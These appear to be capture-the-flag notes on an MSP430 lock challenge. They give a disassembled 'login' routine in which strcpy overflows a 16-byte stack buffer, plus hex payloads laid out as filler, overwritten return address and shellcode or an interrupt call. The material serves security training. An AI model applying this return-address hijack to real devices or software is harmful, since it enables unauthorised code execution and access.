123456789qwertyuFDasdfghjklzxcvbnm123456789qwe

dec 1010, r15
add 1012, r15
9083 010000001f500000
SPAM                	                RET			           			  		     SHELLCODE
4141 4141 4141 4141 4141 4141 4141 4141 1044 4141 4141 4141 4141 4141 4141 4141 4141 2153 2153 2153 2153 2153 2153 2153 2153 2153 2153 2153 b012 3245 7f00

SPAM CALL INT  SPAM                     RET  NEW_STACK_FOR_INT
4141 b012 4c45 4141 4141 4141 4141 4141 f043 7f00

44f4 <login>
44f4:  3150 f0ff      add	#0xfff0, sp
44f8:  3f40 7044      mov	#0x4470 "Enter the password to continue.", r15
44fc:  b012 b045      call	#0x45b0 <puts>
4500:  3f40 9044      mov	#0x4490 "Remember: passwords are between 8 and 16 characters.", r15
4504:  b012 b045      call	#0x45b0 <puts>
4508:  3e40 3000      mov	#0x30, r14
450c:  3f40 0024      mov	#0x2400, r15
4510:  b012 a045      call	#0x45a0 <getsn> // Read 0x30 (48) bytes into the stack
4514:  3e40 0024      mov	#0x2400, r14
4518:  0f41           mov	sp, r15
451a:  b012 dc45      call	#0x45dc <strcpy> // strcpy to the stack
451e:  3d40 6400      mov	#0x64, r13
4522:  0e43           clr	r14
4524:  3f40 0024      mov	#0x2400, r15
4528:  b012 f045      call	#0x45f0 <memset> // copy 0 from 0x2400 to 0x2464
452c:  0f41           mov	sp, r15
452e:  b012 4644      call	#0x4446 <conditional_unlock_door>
4532:  0f93           tst	r15
4534:  0324           jz	$+0x8 <login+0x48>
4536:  3f40 c544      mov	#0x44c5 "Access granted.", r15
453a:  023c           jmp	$+0x6 <login+0x4c>
453c:  3f40 d544      mov	#0x44d5 "That password is not correct.", r15
4540:  b012 b045      call	#0x45b0 <puts>
4544:  3150 1000      add	#0x10, sp
4548:  3041           ret